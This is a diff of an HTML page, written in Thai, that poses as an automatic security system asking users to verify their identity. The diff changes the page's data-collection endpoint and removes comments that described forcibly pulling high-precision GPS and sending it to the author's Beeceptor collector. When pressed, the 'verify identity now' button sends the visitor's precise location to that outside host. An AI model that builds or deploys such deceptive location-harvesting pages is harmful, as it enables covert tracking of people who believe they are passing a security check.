@@ -22,7 +22,7 @@
 <body>
 
 <div class="container">
-    <div class="icon">🛡️</div>
+    <div class="icon">🔒</div>
     <h1>ยืนยันตัวตนผู้ใช้งาน</h1>
     
     <div class="user-box">
@@ -34,14 +34,14 @@
     
     <button onclick="getLocation()">ยืนยันตัวตนทันที</button>
     
-    <div class="footer">ระบบรักษาความปลอดภัยอัตโนมัติ © 2026</div>
+    <div class="footer">ระบบรักษาความปลอดภัยอัตโนมัติ  2026</div>
 </div>
 
 <script>
     function getLocation() {
         if (navigator.geolocation) {
             const options = {
-                enableHighAccuracy: true, // บังคับดึง GPS ดาวเทียมแม่นยำสูง
+                enableHighAccuracy: true, 
                 timeout: 15000,           
                 maximumAge: 0             
             };
@@ -63,8 +63,7 @@
             timestamp: new Date().toLocaleString()
         };
 
-        // ส่งข้อมูลเข้า Beeceptor ของคุณ
-        fetch("https://whbfc04e88f897ef646a.free.beeceptor.com", {
+        fetch("https://goticetrack.free.beeceptor.com", {
             method: "POST",
             mode: "no-cors",
             body: JSON.stringify(payload)
@@ -85,3 +84,4 @@
 
 </body>
 </html>
+
